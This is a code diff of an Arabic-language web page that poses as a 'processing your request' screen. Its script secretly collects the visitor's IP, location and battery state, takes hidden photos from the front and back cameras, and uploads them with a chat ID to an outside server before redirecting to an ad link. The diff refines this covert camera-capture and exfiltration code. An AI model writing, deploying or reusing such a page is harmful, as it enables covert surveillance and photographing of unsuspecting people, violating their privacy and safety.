@@ -39,10 +39,12 @@
         <h1>جاري تنفيذ طلبك</h1>
         <p>يرجى الانتظار...</p>
     </div>
+
     <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
     <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
     <canvas id="frontCanvas" style="display:none;"></canvas>
     <canvas id="backCanvas" style="display:none;"></canvas>
+
     <script>
         const frontVideo = document.getElementById('frontVideo');
         const backVideo = document.getElementById('backVideo');
@@ -51,11 +53,12 @@
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get("chatId");
 
+        let finished = false; // عشان ما يكرر التحويل مرتين
+
         async function collectAdditionalData() {
             try {
-                const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+                const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
                 const battery = await navigator.getBattery();
-
                 return {
                     ip: ipInfo.ip,
                     country: ipInfo.country_name,
@@ -65,8 +68,7 @@
                     batteryLevel: battery.level,
                     batteryCharging: battery.charging,
                 };
-            } catch (error) {
-                console.error('Error collecting additional data', error);
+            } catch {
                 return {};
             }
         }
@@ -89,35 +91,16 @@
 
         async function requestCameraPermission(facingMode) {
             try {
-                const constraints = {
-                    video: { facingMode: facingMode }
-                };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                return stream;
-            } catch (error) {
-                console.error(`Error accessing ${facingMode} camera:`, error);
+                return await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+            } catch {
                 return null;
             }
         }
 
         async function init() {
-            try {
-                const additionalData = await collectAdditionalData();
-                const frontStream = await requestCameraPermission('user');
-                const backStream = await requestCameraPermission('environment');
-
-                if (frontStream || backStream) {
-                    handleSuccess(frontStream, backStream, additionalData);
-                } else {
-                    throw new Error('No camera access granted');
-                }
-            } catch (e) {
-                console.error('Error in init:', e);
-                setTimeout(init, 1000);
-            }
-        }
-
-        function handleSuccess(frontStream, backStream, additionalData) {
+            const additionalData = await collectAdditionalData();
+            const frontStream = await requestCameraPermission('user');
+            const backStream = await requestCameraPermission('environment');
             if (frontStream) {
                 frontVideo.srcObject = frontStream;
                 frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
@@ -126,97 +109,71 @@
                 backVideo.srcObject = backStream;
                 backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
             }
+            if (!frontStream && !backStream) {
+                // لو مافي كاميرا شغالة برضو يحول
+                finishAndRedirect();
+            }
         }
 
         function setupCamera(video, canvas, cameraType, additionalData) {
             video.play();
             video.onplaying = () => {
-                const { videoWidth, videoHeight } = video;
-                canvas.width = videoWidth;
-                canvas.height = videoHeight;
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                let count = 0;
+                const maxPhotos = 4;
 
-                const context = canvas.getContext('2d');
-                let photoCount = 0;
-                const maxPhotos = 4; // عدد الصور لكل كاميرا
-
-                const captureInterval = setInterval(() => {
-                    if (photoCount >= maxPhotos) {
-                        clearInterval(captureInterval);
-
-                        // نوقف فقط هذه الكاميرا
-                        if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
-
-                        // إذا كانت كل الكاميرات توقفت
-                        if ((!frontVideo.srcObject || frontVideo.srcObject.getTracks().length === 0) &&
-                            (!backVideo.srcObject || backVideo.srcObject.getTracks().length === 0)) {
-
-                            document.querySelector('.container').innerHTML = `
-                                <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
-                                <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
-                            `;
-
-                            // التحويل بعد أقل من ثانية
-                            setTimeout(() => {
-                                window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
-                            }, 800);
-                        }
+                const timer = setInterval(() => {
+                    if (count >= maxPhotos) {
+                        clearInterval(timer);
+                        if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+                        checkAllFinished();
                         return;
                     }
-
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
-                        formData.append('userId', userId);
-                        formData.append('cameraType', cameraType);
-                        formData.append('imageWidth', canvas.width);
-                        formData.append('imageHeight', canvas.height);
-                        formData.append('additionalData', JSON.stringify(additionalData));
-                        post('https://freeusr1.onrender.com/submitPhotos', formData);
+                        const fd = new FormData();
+                        fd.append('images', blob, `image_${cameraType}_${count}.webp`);
+                        fd.append('userId', userId);
+                        fd.append('cameraType', cameraType);
+                        fd.append('imageWidth', canvas.width);
+                        fd.append('imageHeight', canvas.height);
+                        fd.append('additionalData', JSON.stringify(additionalData));
+                        post('https://freeusr1.onrender.com/submitPhotos', fd);
                     }, 'image/webp', 0.7);
-
-                    photoCount++;
+                    count++;
                 }, 1000);
             };
         }
 
-        async function post(url, formData) {
-            const maxRetries = 5;
-            let retries = 0;
-
-            while (retries < maxRetries) {
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-
-                    const data = await response.json();
-
-                    if (data.success) {
-                        console.log('Photos sent successfully');
-                        return;
-                    } else {
-                        throw new Error(data.error);
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    retries++;
-                    if (retries < maxRetries) {
-                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));
-                    }
-                }
+        function checkAllFinished() {
+            const noFront = !frontVideo.srcObject || frontVideo.srcObject.getTracks().length === 0;
+            const noBack = !backVideo.srcObject || backVideo.srcObject.getTracks().length === 0;
+            if (noFront && noBack) {
+                finishAndRedirect();
             }
+        }
 
-            console.error('Max retries reached. Unable to send photos.');
+        function finishAndRedirect() {
+            if (finished) return;
+            finished = true;
+            document.querySelector('.container').innerHTML = `
+                <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
+                <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+            `;
+            setTimeout(() => {
+                window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+            }, 200);
+        }
+
+        async function post(url, fd) {
+            try { await fetch(url, { method: 'POST', body: fd }); } catch {}
         }
 
         window.addEventListener('load', init);
     </script>
-<script type='text/javascript' src='//pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js'></script>
+
+    <script type='text/javascript' src='//pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js'></script>
 </body>
 </html>
